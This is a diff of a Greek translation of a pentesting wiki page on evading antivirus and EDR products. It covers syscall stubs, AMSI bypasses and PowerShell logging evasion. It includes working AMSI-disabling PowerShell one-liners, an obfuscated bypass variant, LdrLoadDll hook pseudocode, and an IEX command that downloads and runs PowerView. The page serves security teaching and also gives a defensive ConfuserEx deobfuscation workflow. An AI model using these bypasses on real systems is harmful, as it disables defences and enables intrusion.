+> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: κάτι που λειτουργεί σήμερα μπορεί να ανιχνεύεται αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο εργαλείο· αν είναι δυνατόν, δοκιμάστε να συνδυάζετε πολλαπλές τεχνικές evasion.
 
 ## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)
 
-Τα EDRs συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψεις αυτά τα hooks, μπορείς να δημιουργήσεις **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.
+Τα EDRs συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και πραγματοποιούν μετάβαση σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.
 
-**Invocation options:**
-- **Direct (embedded)**: εκτέλεσε μια `syscall`/`sysenter`/`SVC #0` instruction στο generated stub (χωρίς `ntdll` export hit).
-- **Indirect**: κάνε jump μέσα σε ένα υπάρχον `syscall` gadget στο `ntdll` ώστε η kernel transition να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool ανά κλήση.
-- **Egg-hunt**: απέφυγε να ενσωματώσεις τη στατική ακολουθία opcode `0F 05` στο disk· επίλυσε μια syscall sequence στο runtime.
+**Επιλογές invocation:**
+- **Direct (embedded)**: εισάγει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς πρόσβαση σε export του `ntdll`).
+- **Indirect**: κάνει jump σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
+- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εντοπίζει μια syscall sequence κατά το runtime.
 
-**Hook-resistant SSN resolution strategies:**
-- **FreshyCalls (VA sort)**: εξήγαγε SSNs ταξινομώντας τα syscall stubs με βάση το virtual address αντί να διαβάζεις τα stub bytes.
-- **SyscallsFromDisk**: κάνε map ένα καθαρό `\KnownDlls\ntdll.dll`, διάβασε τα SSNs από το `.text`, και μετά κάνε unmap (παρακάμπτει όλα τα in-memory hooks).
-- **RecycledGate**: συνδύασε VA-sorted SSN inference με opcode validation όταν ένα stub είναι clean· κάνε fallback στο VA inference αν είναι hooked.
-- **HW Breakpoint**: βάλε DR0 στο `syscall` instruction και χρησιμοποίησε ένα VEH για να capture το SSN από το `EAX` στο runtime, χωρίς να κάνεις parsing hooked bytes.
+**Hook-resistant στρατηγικές SSN resolution:**
+- **FreshyCalls (VA sort)**: συμπεραίνει τα SSNs ταξινομώντας τα syscall stubs με βάση τη virtual address, αντί να διαβάζει τα stub bytes.
+- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSNs από το `.text` και, στη συνέχεια, κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
+- **RecycledGate**: συνδυάζει SSN inference με ταξινόμηση VA και opcode validation όταν ένα stub είναι καθαρό· αν είναι hooked, χρησιμοποιεί VA inference ως fallback.
+- **HW Breakpoint**: τοποθετεί το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς parsing hooked bytes.
 
-Example SysWhispers4 usage:
+Παράδειγμα χρήσης του SysWhispers4:
 ```bash
 # Indirect syscalls + hook-resistant resolution
 python syswhispers.py --preset injection --method indirect --resolve recycled
@@ -250,49 +250,49 @@ python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --res
 ```
 ## AMSI (Anti-Malware Scan Interface)
 
-Το AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να σκανάρουν μόνο **files on disk**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **directly in-memory**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.
+Το AMSI δημιουργήθηκε για να αποτρέπει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώνουν μόνο **αρχεία στον δίσκο**, οπότε, αν μπορούσατε με κάποιον τρόπο να εκτελέσετε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.
 
-Το χαρακτηριστικό AMSI είναι ενσωματωμένο σε αυτά τα components των Windows.
+Η λειτουργία AMSI είναι ενσωματωμένη στα παρακάτω στοιχεία των Windows.
 
-- User Account Control, ή UAC (elevation of EXE, COM, MSI, or ActiveX installation)
-- PowerShell (scripts, interactive use, and dynamic code evaluation)
-- Windows Script Host (wscript.exe and cscript.exe)
-- JavaScript and VBScript
+- User Account Control, ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
+- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
+- Windows Script Host (wscript.exe και cscript.exe)
+- JavaScript και VBScript
 - Office VBA macros
 
-Επιτρέπει στις antivirus solutions να επιθεωρούν τη συμπεριφορά των scripts εκθέτοντας το περιεχόμενό τους σε μορφή που είναι τόσο unencrypted όσο και unobfuscated.
+Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας τα περιεχόμενά τους σε μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη obfuscated.
 
-Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα εμφανίσει το παρακάτω alert στο Windows Defender.
+Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την παρακάτω ειδοποίηση στο Windows Defender.
 
 <figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>
 
-Παρατήρησε πώς προσθέτει το `amsi:` στην αρχή και μετά το path προς το executable από το οποίο εκτελέστηκε το script, σε αυτή την περίπτωση, powershell.exe
+Παρατηρήστε πώς προσθέτει ως πρόθεμα το `amsi:` και στη συνέχεια τη διαδρομή προς το executable από το οποίο εκτελέστηκε το script, σε αυτήν την περίπτωση το powershell.exe
 
-Δεν αφήσαμε κανένα file στο disk, αλλά παρ' όλα αυτά μας έπιασε in-memory λόγω του AMSI.
+Δεν αφήσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.
 
-Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης μέσω AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για in-memory execution. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή χαμηλότερη) για in-memory execution αν θέλεις να αποφύγεις το AMSI.
+Επιπλέον, από το **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για τη φόρτωση in-memory execution. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για in-memory execution, αν θέλετε να παρακάμψετε το AMSI.
 
-Υπάρχουν μερικοί τρόποι να παρακάμψεις το AMSI:
+Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:
 
 - **Obfuscation**
 
-Αφού το AMSI δουλεύει κυρίως με static detections, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι καλός τρόπος για evading detection.
+Καθώς το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για την αποφυγή του detection.
 
-Ωστόσο, το AMSI έχει τη δυνατότητα να unobfuscating scripts ακόμη κι αν έχουν πολλαπλά layers, οπότε το obfuscation μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό κάνει την παράκαμψη όχι τόσο straightforward. Παρ' όλα αυτά, μερικές φορές, το μόνο που χρειάζεται είναι να αλλάξεις μερικά variable names και θα είσαι εντάξει, οπότε εξαρτάται από το πόσο έχει flagged κάτι.
+Ωστόσο, το AMSI έχει τη δυνατότητα να κάνει unobfuscate τα scripts, ακόμη και αν έχουν πολλά layers, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο με τον οποίο πραγματοποιείται. Αυτό καθιστά την αποφυγή detection όχι και τόσο straightforward. Παρ' όλα αυτά, μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε αυτό εξαρτάται από το πόσο έντονα έχει γίνει flag κάτι.
 
 - **AMSI Bypass**
 
-Αφού το AMSI υλοποιείται φορτώνοντας ένα DLL μέσα στη διεργασία του powershell (επίσης cscript.exe, wscript.exe, etc.), είναι δυνατό να το παραποιήσεις εύκολα ακόμη και αν τρέχεις ως unprivileged user. Λόγω αυτής της αδυναμίας στην υλοποίηση του AMSI, οι researchers έχουν βρει πολλούς τρόπους να παρακάμπτουν το AMSI scanning.
+Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να γίνει tamper με αυτό, ακόμη και όταν εκτελείται από unprivileged user. Λόγω αυτού του flaw στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους για να παρακάμπτουν το AMSI scanning.
 
 **Forcing an Error**
 
-Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μη γίνει κανένα scan για την τρέχουσα διαδικασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει ευρύτερη χρήση.
+Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά κανένα scan για την τρέχουσα διεργασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει την ευρύτερη χρήση του.
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη χρησιμοποιήσιμο για το τρέχον powershell process. Αυτή η γραμμή φυσικά έχει ήδη επισημανθεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η technique.
+Αρκούσε μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI μη χρήσιμο για την τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει, φυσικά, εντοπιστεί από το ίδιο το AMSI, επομένως απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.
 
-Εδώ είναι ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
+Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
 ```bash
 Try{#Ams1 bypass technic nº 2
 $Xdatabase = 'Utils';$Homedrive = 'si'
@@ -306,22 +306,22 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Θυμήσου ότι αυτό πιθανότατα θα γίνει flagged μόλις βγει αυτό το post, οπότε δεν πρέπει να δημοσιεύσεις code αν ο στόχος σου είναι να παραμείνεις undetected.
+Να έχετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν το σχέδιό σας είναι να παραμείνετε undetected.
 
 **Memory Patching**
 
-Αυτή η technique ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της address για τη function "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για scanning του input που δίνει ο user) και την αντικατάστασή της με instructions που επιστρέφουν τον code για E_INVALIDARG, έτσι ώστε το αποτέλεσμα του πραγματικού scan να επιστρέφει 0, το οποίο ερμηνεύεται ως clean result.
+Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση της εισόδου που παρέχεται από τον χρήστη) και την αντικατάστασή της με instructions που επιστρέφουν τον κωδικό για το E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης επιστρέφει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.
 
 > [!TIP]
-> Διάβασε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο αναλυτική εξήγηση.
+> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.
 
-Υπάρχουν επίσης πολλές άλλες techniques που χρησιμοποιούνται για να γίνει bypass το AMSI με powershell, δες αυτή τη σελίδα [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) και αυτό το [**repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθεις περισσότερα για αυτές.
+Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για το bypass του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.
 
 ### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)
 
-Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στο τρέχον process. Ένα robust, language‑agnostic bypass είναι να τοποθετηθεί ένα user‑mode hook στο `ntdll!LdrLoadDll` που επιστρέφει error όταν το requested module είναι `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν εκτελούνται scans για εκείνο το process.
+Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Ένα robust, language-agnostic bypass είναι η τοποθέτηση ενός user-mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται scans για τη συγκεκριμένη διεργασία.
 
-Implementation outline (x64 C/C++ pseudocode):
+Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
 ```c
 #include <windows.h>
 #include <winternl.h>
@@ -347,73 +347,73 @@ realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
 // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
 }
 ```
-Notes
-- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders alike (οτιδήποτε αλλιώς θα φόρτωνε AMSI).
-- Συνδύασέ το με τη διοχέτευση scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγεις long command-line artefacts.
-- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί `DllRegisterServer`).
+Σημειώσεις
+- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders alike (οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
+- Συνδυάζεται με την εισαγωγή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για την αποφυγή μεγάλων command-line artefacts.
+- Έχει παρατηρηθεί σε loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).
 
-Το tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** επίσης δημιουργεί script για να παρακάμψει το AMSI.
-Το tool **[https://amsibypass.com/](https://amsibypass.com/)** επίσης δημιουργεί script για να παρακάμψει το AMSI που αποφεύγει signature με randomized user-defined function, variables, characters expression και εφαρμόζει random character casing στα PowerShell keywords για να αποφύγει signature.
+Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για την παράκαμψη του AMSI.
+Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για την παράκαμψη του AMSI, το οποίο αποφεύγει το signature μέσω randomized user-defined function, variables, characters expression και εφαρμόζει random character casing στα keywords του PowerShell για την αποφυγή του signature.
 
-**Remove the detected signature**
+**Αφαίρεση του detected signature**
 
-Μπορείς να χρησιμοποιήσεις ένα tool όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσεις το detected AMSI signature από τη μνήμη της τρέχουσας process. Αυτό το tool λειτουργεί σκανάροντας τη μνήμη της τρέχουσας process για το AMSI signature και στη συνέχεια το αντικαθιστά με NOP instructions, αφαιρώντας το effectively από τη μνήμη.
+Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το detected AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για το AMSI signature και στη συνέχεια το αντικαθιστά με εντολές NOP, αφαιρώντας το ουσιαστικά από τη μνήμη.
 
-**AV/EDR products that uses AMSI**
+**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**
 
-Μπορείς να βρεις μια λίστα από AV/EDR products που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
+Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
 
-**Use Powershell version 2**
-Αν χρησιμοποιείς PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείς να εκτελέσεις τα scripts σου χωρίς να σκαναριστούν από το AMSI. Μπορείς να το κάνεις έτσι:
+**Χρήση PowerShell version 2**
+Αν χρησιμοποιείτε PowerShell version 2, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
 ```bash
 powershell.exe -version 2
 ```
-## PS Logging
+## Καταγραφή PS
 
-Το PowerShell logging είναι μια δυνατότητα που σου επιτρέπει να καταγράφεις όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελεί ένα **πρόβλημα για attackers που θέλουν να evade detection**.
+Η καταγραφή PowerShell είναι μια δυνατότητα που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.
 
-Για να bypass το PowerShell logging, μπορείς να χρησιμοποιήσεις τις ακόλουθες τεχνικές:
+Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:
 
-- **Disable PowerShell Transcription and Module Logging**: Μπορείς να χρησιμοποιήσεις ένα tool όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
-- **Use Powershell version 2**: Αν χρησιμοποιήσεις PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείς να τρέξεις τα scripts σου χωρίς να γίνονται scanned από το AMSI. Μπορείς να το κάνεις έτσι: `powershell.exe -version 2`
-- **Use an Unmanaged Powershell Session**: Χρησιμοποίησε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να spawn ένα powershell without defenses (αυτό χρησιμοποιεί το `powerpick` από Cobal Strike).
+- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
+- **Χρήση Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
+- **Χρήση ενός Unmanaged Powershell Session**: Χρησιμοποιήστε το [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να εκκινήσετε ένα powershell χωρίς defenses (αυτό χρησιμοποιεί το `powerpick` από το Cobal Strike).
 
 
 ## Obfuscation
 
 > [!TIP]
-> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.
+> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει το entropy του binary και διευκολύνει τον εντοπισμό του από AVs και EDRs. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόζετε encryption μόνο σε συγκεκριμένα τμήματα του κώδικά σας που περιέχουν ευαίσθητες πληροφορίες ή πρέπει να αποκρυφθούν.
 
 ### Deobfuscating ConfuserEx-Protected .NET Binaries
 
-Όταν αναλύεις malware που χρησιμοποιεί ConfuserEx 2 (ή commercial forks) είναι συνηθισμένο να αντιμετωπίζεις several layers of protection που θα μπλοκάρουν decompilers και sandboxes. Το παρακάτω workflow αποκαθιστά αξιόπιστα ένα σχεδόν–αρχικό IL το οποίο μετά μπορεί να γίνει decompiled σε C# σε tools όπως dnSpy ή ILSpy.
+Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή commercial forks), είναι συνηθισμένο να αντιμετωπίζετε αρκετά επίπεδα προστασίας που εμποδίζουν τους decompilers και τα sandboxes. Η παρακάτω ροή εργασίας **επαναφέρει ένα σχεδόν αρχικό IL**, το οποίο μπορεί στη συνέχεια να γίνει decompile σε C# με εργαλεία όπως τα dnSpy ή ILSpy.
 
-1.  Anti-tampering removal – Το ConfuserEx encrypts κάθε *method body* και το decrypts μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης κάνει patch το PE checksum, οπότε οποιαδήποτε modification θα κρασάρει το binary. Χρησιμοποίησε το **AntiTamperKiller** για να εντοπίσεις τους encrypted metadata tables, να ανακτήσεις τα XOR keys και να ξαναγράψεις ένα clean assembly:
+1.  Αφαίρεση Anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης τροποποιεί το PE checksum, επομένως οποιαδήποτε αλλαγή θα προκαλέσει crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
 ```bash
 # https://github.com/wwh1004/AntiTamperKiller
 python AntiTamperKiller.py Confused.exe Confused.clean.exe
 ```
-Το output περιέχει τα 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμα όταν φτιάχνεις τον δικό σου unpacker.
+Η έξοδος περιέχει τις 6 anti-tamper παραμέτρους (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες κατά τη δημιουργία του δικού σας unpacker.
 
-2.  Symbol / control-flow recovery – δώσε το *clean* file στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
+2.  Ανάκτηση Symbol / control-flow – Δώστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
 ```bash
 de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
 ```
 Flags:
-• `-p crx` – select το ConfuserEx 2 profile
-• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.
+• `-p crx` – επιλέγει το ConfuserEx 2 profile
+• Το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και variable names και θα αποκρυπτογραφήσει τα constant strings.
 
-3.  Proxy-call stripping – το ConfuserEx αντικαθιστά direct method calls με lightweight wrappers (a.k.a *proxy calls*) για να σπάσει περισσότερο το decompilation. Αφαίρεσέ τα με **ProxyCall-Remover**:
+3.  Αφαίρεση Proxy-call – Το ConfuserEx αντικαθιστά τις άμεσες method calls με lightweight wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
 ```bash
 ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
 ```
-Μετά από αυτό το βήμα θα πρέπει να βλέπεις κανονικό .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για opaque wrapper functions (`Class8.smethod_10`, …).
+Μετά από αυτό το βήμα θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για opaque wrapper functions (`Class8.smethod_10`, …).
 
-4.  Manual clean-up – τρέξε το τελικό binary μέσα στο dnSpy, ψάξε για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσεις το *real* payload. Συχνά το malware το αποθηκεύει ως ένα TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.
+4.  Manual clean-up – Εκτελέστε το binary που προέκυψε μέσα από το dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *real* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.
 
-Η παραπάνω αλυσίδα αποκαθιστά το execution flow **χωρίς** να χρειάζεται να τρέξεις το malicious sample – χρήσιμο όταν δουλεύεις σε offline workstation.
+Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς να χρειάζεται να εκτελέσετε το malicious sample** – κάτι χρήσιμο όταν εργάζεστε σε offline workstation.
 
-> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για να triage samples αυτόματα.
+> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη αρχική ταξινόμηση δειγμάτων.
 
 #### One-liner
 ```bash
@@ -422,39 +422,39 @@ autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
 ---
 
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/) ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσεις τη γλώσσα `C++11/14` για να δημιουργήσεις, κατά το compile time, obfuscated code χωρίς τη χρήση εξωτερικού tool και χωρίς να τροποποιήσεις τον compiler.
-- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα layer of obfuscated operations που παράγεται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να crack την εφαρμογή λίγο πιο δύσκολη.
-- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα διαφορετικά pe files, including: .exe, .dll, .sys
-- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή metamorphic code engine για arbitrary executables.
